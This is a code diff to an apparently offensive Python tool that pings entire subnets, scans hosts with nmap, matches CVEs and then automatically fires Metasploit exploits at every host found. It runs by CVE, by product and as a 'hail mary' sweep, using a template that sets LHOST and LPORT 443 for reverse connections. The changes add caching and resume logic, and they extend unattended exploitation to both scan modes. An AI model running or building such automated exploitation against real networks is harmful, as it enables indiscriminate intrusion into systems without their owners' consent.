@@ -41,10 +41,11 @@ nmap_args = f"-sS -n -Pn --max-scan-delay 0" # Default extra nmap args. No DNS l
 
 # Input/Output location.
 results_dir = "results/"
-results_partial_dir = "results/partial/"
-results_full_dir = "results/full/"
+results_partial_dir = f"{results_dir}partial/"
+results_full_dir = f"{results_dir}full/"
 nist_api_key_filename = "api.txt"
 ip_list_filename = "ip_list.txt"
+cached_msf_searches_filename = f"{results_dir}/msf_search_cache.json"
 
 # Metasploit options.
 msfconsole_command = 'msfconsole -x "use {};set RHOSTS {};set RPORT {};set LHOST {};set LPORT 443;show targets"'
@@ -72,6 +73,7 @@ ping_thread_list = []
 all_scan_results = {}
 all_scan_reports = []
 all_attempted_msf_exploits = {}
+cached_msf_searches = {}
 
 # ======================================================================================================================
 # SCANNING / PINGING / CVE-FINDING / REPORT CREATION FUNCTIONS
@@ -83,6 +85,9 @@ def scan_host(ip: str, do_full_scan=False):
     global results_partial_dir, results_full_dir, all_scan_reports
     retry_count = 3 # Retry 3 times.
     results = {}
+    scan_output_filename = f"{results_full_dir if do_full_scan else results_partial_dir}{ip}{'_full_results.json' if do_full_scan else '_partial_results.json'}"
+
+    print(scan_output_filename)
 
     print("Starting scan.")
     scanner = AutoScanner()
@@ -99,15 +104,14 @@ def scan_host(ip: str, do_full_scan=False):
 
     while retry_count > 0:
         try:
-            results = scanner.scan(ip, host_timeout=host_timeout, scan_speed=scan_speed, apiKey=api_key,
+            if os.path.isfile(scan_output_filename):
+                print(f"Found previous scan info, skpping scan of {ip}.")
+                results = load_results_json(scan_output_filename)
+            else:
+                results = scanner.scan(ip, host_timeout=host_timeout, scan_speed=scan_speed, apiKey=api_key,
                                    os_scan=os_scan, scan_vulns=scan_vulns, nmap_args=full_nmap_args, debug=debug_scan)
 
-            if do_full_scan:
-                if len(ip) == 1:
-                    scanner.save_to_file(results_full_dir + ip[0] + "_full_results.json")
-            else:
-                if len(ip) == 1:
-                    scanner.save_to_file(results_partial_dir + ip[0] + "_partial_results.json")
+                scanner.save_to_file(scan_output_filename)
 
             for ip in results:
                 all_scan_results[ip] = results[ip]
@@ -125,7 +129,7 @@ def scan_host(ip: str, do_full_scan=False):
     retry_count = 3
     while retry_count > 0:
         try:
-            exploit_report = parse_scan_results(results)
+            exploit_report = parse_scan_results(results, do_full_scan)
             all_scan_reports.append(exploit_report)
             print(exploit_report)
             retry_count = 0
@@ -138,7 +142,7 @@ def scan_host(ip: str, do_full_scan=False):
             else:
                 print("Not retrying...")
 
-    print("Scan complete.")
+    print(f"Scan of {ip} complete.")
 
 
 def ping_host(ip:str):
@@ -227,9 +231,14 @@ def get_ports_from_product(scan_result: dict, ip: str, product: str):
     return ports
 
 
-def parse_scan_results(scan_result):
+def parse_scan_results(scan_result, is_full_scan=False):
     report = ""
     for ip in scan_result:
+        scan_output_filename = f"{results_full_dir if is_full_scan else results_partial_dir}{ip}{'_full_report.txt' if is_full_scan else '_partial_report.txt'}"
+        if os.path.isfile(scan_output_filename):
+            with open(scan_output_filename, "r", encoding="utf-8") as out_file:
+                report += out_file.read()
+            continue
         for product in scan_result[ip]['vulns']:
             for cve in scan_result[ip]['vulns'][product]:
                 ports = get_ports_from_product(scan_result, ip, product)
@@ -237,6 +246,9 @@ def parse_scan_results(scan_result):
                 if len(result) > 0:
                     print(result)
                     report += result + "\n"
+
+        with open(scan_output_filename, "w", encoding="utf-8") as out_file:
+            out_file.write(report)
 
     return report
 
@@ -389,6 +401,8 @@ def run_msf_exploit(exploit_name: str, rhosts: str, rport: int):
         print(f"Already attempted: {rhosts}:{rport} - {exploit_name}")
         return
 
+    print(f"Attempting {exploit_name} on {rhosts}:{rport}")
+
     exploit = msf_client.modules.use('exploit', exploit_name)
     try:
         exploit['RHOSTS'] = rhosts
@@ -439,6 +453,10 @@ def run_msf_exploit(exploit_name: str, rhosts: str, rport: int):
 
 def run_msf_search(search_args: str):
     global msf_client
+    global cached_msf_searches
+
+    if search_args in cached_msf_searches:
+        return cached_msf_searches[search_args]
 
     new_console: msfrpc.MsfConsole = msf_client.consoles.console()
     while new_console.is_busy():
@@ -464,6 +482,8 @@ def run_msf_search(search_args: str):
 
     new_console.destroy()
 
+    cached_msf_searches[search_args] = all_results
+
     return all_results
 
 
@@ -487,7 +507,7 @@ def run_msf_hail_mary_on_ip_port(rhost: str, rport: int):
 def run_msf_against_cve(cve: str, rhost: str, rports:list):
     global msf_search_result_max
     exploit_count = 0
-    search_results = run_msf_search(f"cve:{cve} type:exploit rank:excellent -s date -r")
+    search_results = run_msf_search(f"cve:{cve.replace('CVE-','')} type:exploit rank:excellent -s date -r")
 
     for result in search_results:
         for rport in rports:
@@ -542,7 +562,7 @@ def log_msf_exploit_attempt(ip: str, rport:int, exploit_name:str):
         all_attempted_msf_exploits[ip] = {}
 
     if not str(rport) in all_attempted_msf_exploits[ip]:
-        all_attempted_msf_exploits[ip][rport] = []
+        all_attempted_msf_exploits[ip][str(rport)] = []
 
     if not exploit_name in all_attempted_msf_exploits[ip][str(rport)]:
         all_attempted_msf_exploits[ip][str(rport)].append(exploit_name)
@@ -550,9 +570,6 @@ def log_msf_exploit_attempt(ip: str, rport:int, exploit_name:str):
 
 def is_msf_exploit_untested(ip: str, rport:int, exploit_name:str):
     global all_attempted_msf_exploits
-
-    if exploit_name.find('vsftp') > 0:
-        print("Debug here.")
 
     if ip not in all_attempted_msf_exploits:
         return True
@@ -590,12 +607,21 @@ def main():
     global nist_api_key_filename
     global ip_list_filename
     global do_continue_processing_scan_queue
+    global cached_msf_searches
 
     # Example of how to parse jsons.
     # results = load_results_json("results/partial_results.json")
     # parse_scan_results(results)
 
-    print("Starting msfconsole in tmux session...")
+    if os.path.isfile(results_dir + "exploits_attempted.json"):
+        with open(results_dir + "exploits_attempted.json", "r") as fp:
+            all_attempted_msf_exploits = json.load(fp)
+
+    if os.path.isfile(cached_msf_searches_filename):
+        with open(cached_msf_searches_filename, "r") as fp:
+            cached_msf_searches = json.load(fp)
+
+    print("Starting msfconsole in tmux session. Interact with it via 'tmux a -t qpwn-msfconsole'")
     start_metasploit_tmux()
 
     print("Creating scan thread.")
@@ -610,6 +636,8 @@ def main():
             print("Unable to load api key. Put api key in api.txt.")
 
     if os.path.isfile(ip_list_filename):
+        print("Performing full scan.")
+        print(f"Reading IPs from f{ip_list_filename} to run full scans.")
         with open(ip_list_filename, "r") as ips:
             for ip in ips:
                 add_scan_to_queue(ip.strip(), True)
@@ -625,7 +653,18 @@ def main():
         with open(results_dir + "full_report.txt", "w") as outfile:
             outfile.write(assemble_final_report())
 
+        print("Automatically running MSF exploits with CVEs...")
+        run_msf_against_scan_result_cves(all_scan_results)
+
+        print("Automatically running MSF exploits with Products...")
+        run_msf_against_scan_result_products(all_scan_results)
+
+        print("Automatically running MSF hail mary attack...")
+        run_msf_hail_mary_scan_result(all_scan_results)
+
     else:
+        print("Performing first quick scan.")
+        print("Pinging subnets to find hosts...")
         for subnet in subnets:
             for ip in ipaddress.IPv4Network(subnet):
                 wait_for_open_thread(ping_thread_list, max_ping_threads)
@@ -646,23 +685,17 @@ def main():
         with open(results_dir + "partial_report.txt", "w") as outfile:
             outfile.write(assemble_final_report())
 
-    if os.path.isfile(results_dir + "exploits_attempted.json"):
-        with open(results_dir + "exploits_attempted.json", "r") as fp:
-            all_attempted_msf_exploits = json.load(fp)
+        print("Automatically running MSF exploits with CVEs...")
+        run_msf_against_scan_result_cves(all_scan_results)
 
-    print(all_attempted_msf_exploits)
-
-    print("Automatically running MSF exploits with CVEs...")
-    run_msf_against_scan_result_cves(all_scan_results)
-
-    print("Automatically running MSF exploits with Products...")
-    run_msf_against_scan_result_products(all_scan_results)
-
-    print("Automatically running MSF hail mary attack...")
-    run_msf_hail_mary_scan_result(all_scan_results)
+        print("Automatically running MSF exploits with Products...")
+        run_msf_against_scan_result_products(all_scan_results)
 
     with open(results_dir + "exploits_attempted.json", "w") as outfile:
         json.dump(all_attempted_msf_exploits, outfile, indent=2)
+
+    with open(cached_msf_searches_filename, "w") as outfile:
+        json.dump(cached_msf_searches, outfile, indent=2)
 
 
 if __name__ == "__main__":
